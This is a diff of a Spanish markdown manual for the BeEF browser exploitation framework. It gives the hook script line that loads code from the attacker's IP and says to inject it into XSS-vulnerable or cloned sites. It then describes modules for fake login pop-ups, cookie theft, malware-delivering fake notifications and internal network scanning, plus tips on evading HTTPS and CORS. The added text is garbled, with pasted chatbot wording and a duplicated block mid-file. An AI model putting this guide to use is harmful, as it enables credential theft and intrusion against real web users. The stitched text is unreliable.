@@ -1,25 +1,76 @@
-Flujo de Trabajo
-Iniciar BeEF: Se ejecuta el servidor y se accede al panel de control (http://127.0.0.1:3000/ui/panel).
+# 🐂 Manual de Uso: BeEF
 
-Hooking: El objetivo debe visitar una web que contenga el script de "gancho" (hook).
+> **Browser Exploitation Framework**. Se especializa en atacar navegadores web para usarlos como "cabeza de playa" en una red.
 
-<script src="http://[Tu_IP]:3000/hook.js"></script>
+## 🎣 Flujo de Trabajo: El ataque del "Gancho"
 
-Control: Una vez el navegador "pica el anzuelo", aparece en tu panel y puedes ejecutar comandos.
+El funcionamiento de BeEF se basa en tres pasos críticos:
 
-Comandos y Módulos Comunes en el Panel
-Social Engineering:
+### 1. Iniciar el Servidor
+Ejecuta BeEF en tu terminal y abre el panel de control (requiere credenciales por defecto `beef` / `beef`).
 
-Pretty Theft: Muestra una ventana falsa de login (Facebook, Google) para robar credenciales.
+```bash
+sudo beef-xss
+# Panel de Control: [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)
 
-Host:
+2. Inyectar el Hook (El Anzuelo)
+El objetivo debe visitar una página web que contenga el script malicioso. Debes inyectar esta línea en el código HTML de una web vulnerable (XSS) o en una web clonada:
 
-Get Cookies: Roba las cookies de sesión del usuario.
+<script src="http://[TU_IP]:3000/hook.js"></script>
 
-Get Installed Plugins: Lista qué extensiones tiene el navegador.
+Aquí tienes el manual final para BeEF.
 
-Network:
+Para este, he aprovechado una función especial de GitHub llamada "Alerts" (lo verás en la parte de [!IMPORTANT]). Cuando subas esto a GitHub, esa parte se convertirá automáticamente en una caja de alerta morada muy profesional.
 
-Port Scanner: Escanea la red interna de la víctima desde su propio navegador.
+He usado el emoji del buey/toro 🐂 por el nombre de la herramienta.
 
-[!IMPORTANT] Nota de seguridad: Recuerda que para que BeEF funcione en entornos modernos, a veces es necesario evadir protecciones como el HTTPS o políticas de CORS, dependiendo de la técnica de entrega del "hook".
+Copia esto en tu archivo BeEFmanual.md:
+
+Markdown
+
+# 🐂 Manual de Uso: BeEF
+
+> **Browser Exploitation Framework**. Se especializa en atacar navegadores web para usarlos como "cabeza de playa" en una red.
+
+## 🎣 Flujo de Trabajo: El ataque del "Gancho"
+
+El funcionamiento de BeEF se basa en tres pasos críticos:
+
+### 1. Iniciar el Servidor
+Ejecuta BeEF en tu terminal y abre el panel de control (requiere credenciales por defecto `beef` / `beef`).
+
+```bash
+sudo beef-xss
+# Panel de Control: [http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)
+2. Inyectar el Hook (El Anzuelo)
+El objetivo debe visitar una página web que contenga el script malicioso. Debes inyectar esta línea en el código HTML de una web vulnerable (XSS) o en una web clonada:
+
+HTML
+
+<script src="http://[TU_IP]:3000/hook.js"></script>
+3. Control (Command & Control)
+En cuanto el navegador de la víctima carga ese script, aparecerá como "Online" en tu panel (columna izquierda). Ahora puedes enviarle comandos.
+
+🎛️ Módulos y Comandos Destacados
+Una vez el navegador está "enganchado", puedes lanzar estos ataques desde la pestaña Commands:
+
+🎭 Ingeniería Social (Social Engineering)
+Pretty Theft: Lanza una ventana flotante falsa (pop-up) simulando un login de Facebook, Google o LinkedIn. Si el usuario escribe su contraseña, esta se envía a tu panel.
+
+Fake Notification: Muestra una barra de notificación falsa en el navegador pidiendo instalar un "plugin" (que en realidad es un malware).
+
+💻 Información del Host (Host)
+Get Cookies: Roba las cookies de sesión (útil para Session Hijacking).
+
+Get Installed Plugins: Lista qué extensiones tiene instaladas el navegador.
+
+Webcam / Microphone: (Experimental) Intenta pedir permisos para activar la cámara o micro.
+
+🌐 Red (Network)
+Port Scanner: ¡Muy potente! Usa el navegador de la víctima para escanear la red interna (Intranet) de la empresa, saltándose el firewall perimetral.
+
+[!IMPORTANT] Nota de Seguridad y Evasión Para que BeEF funcione en navegadores modernos, a menudo es necesario evadir protecciones como el HTTPS o las políticas CORS.
+
+Si la web víctima usa HTTPS, tu servidor BeEF también debería tener un certificado SSL, o el navegador bloqueará el script por "contenido mixto".
+
+
